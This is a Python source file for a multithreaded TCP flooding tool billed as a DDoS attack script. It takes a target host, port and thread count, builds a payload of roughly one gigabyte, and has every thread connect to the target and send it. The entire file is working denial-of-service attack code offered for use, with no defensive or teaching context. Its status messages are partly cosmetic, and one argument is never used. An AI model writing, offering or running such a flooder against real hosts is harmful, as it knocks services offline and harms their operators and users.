import argparse as arg                                        
import socket
import threading
import os                                                     
import colorama
from colorama import Fore
from colorama import Style

colorama.init()      

os.system('cls' if os.name == 'nt' else 'clear')

print(Fore.RED + """
▓█████▄  ██▓▓█████  ██▓     ▒█████   ▄▄▄      ▓█████▄
▒██▀ ██▌▓██▒▓█   ▀ ▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌
░██   █▌▒██▒▒███   ▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌
░▓█▄   ▌░██░▒▓█  ▄ ▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌
░▒████▓ ░██░░▒████▒░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓
 ▒▒▓  ▒ ░▓  ░░ ▒░ ░░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒
 ░ ▒  ▒  ▒ ░ ░ ░  ░░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒
 ░ ░  ░  ▒ ░   ░     ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░
   ░     ░     ░  ░    ░  ░    ░ ░        ░  ░   ░
 ░                                             ░
                                © Pham Chien
""" + Style.RESET_ALL)
def main():
        parser_type = arg.ArgumentParser(description='DDoS Attacb TCP')
        parser_type.add_argument('--host', type=str, help='Update Host Target')
        parser_type.add_argument('--port', type=int, help='Update Port Target')
        parser_type.add_argument('--time', type=int, help='Update Time')
        parser_type.add_argument('--bytes', type=int, help='Update Data Size Bytes')

        args = parser_type.parse_args()

        HOST = args.host
        PORT = args.port
        TIME = args.time
        BYTE = args.bytes

        DATA = b'a' * (1024 * 1024 * 1080)

        if HOST:
                print("" + Style.RESET_ALL)
                print(f'HOST : {HOST}')
                print(f'PORT : {PORT}')
                print(f'TIME : {TIME}')
                print(f"BYTE : {BYTE}")
                print("")
                print(Fore.GREEN + "[info] " + Style.RESET_ALL + "TOTAL SOCK : 200 OK")
                print(Fore.GREEN + "[info] " + Style.RESET_ALL + "Getting Socks data random")
                print(Fore.RED + "[warning] " + Style.RESET_ALL + "CTRL + C to exit attack...")
                print(Fore.GREEN + "[info] " + Style.RESET_ALL + "Starting Attack {HOST}:{PORT}...")
                def attack():
                        s = socket.socket(
                                socket.AF_INET,
                                socket.SOCK_STREAM
                        )
                        s.connect((HOST, PORT))
                        s.send(DATA)
                        s.sendall(DATA)
                        s.close()

                if __name__ == '__main__':
                        threads = []

                        for i in range(TIME):
                                t = threading.Thread(target=attack)
                                threads.append(t)
                                t.start()

                        for t in threads:
                                t.join()
                print("[info] Attack Completed")

        else:
                print('usage: python or python3 tcp.py -h or --help')
                exit()

if __name__ == '__main__':
        main()
